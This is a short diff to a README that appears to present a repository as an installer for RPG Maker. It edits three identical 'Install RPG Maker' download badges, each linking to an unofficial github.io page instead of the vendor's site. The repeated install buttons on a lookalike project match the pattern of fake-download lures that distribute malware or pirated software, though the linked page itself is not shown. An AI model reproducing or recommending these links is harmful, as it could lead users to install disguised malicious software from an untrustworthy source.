@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install RPG Maker](https://img.shields.io/badge/⬇_Install_RPG%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install RPG Maker](https://img.shields.io/badge/⬇_Install_RPG+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ RPG Maker is the world's most popular tool for creating Japanese-style role-play
 
 <div align="center">
 
-[![⬇ Install RPG Maker](https://img.shields.io/badge/⬇_Install_RPG%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install RPG Maker](https://img.shields.io/badge/⬇_Install_RPG+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ RPG Maker is the world's most popular tool for creating Japanese-style role-play
 
 <div align="center">
 
-[![⬇ Install RPG Maker](https://img.shields.io/badge/⬇_Install_RPG%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install RPG Maker](https://img.shields.io/badge/⬇_Install_RPG+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
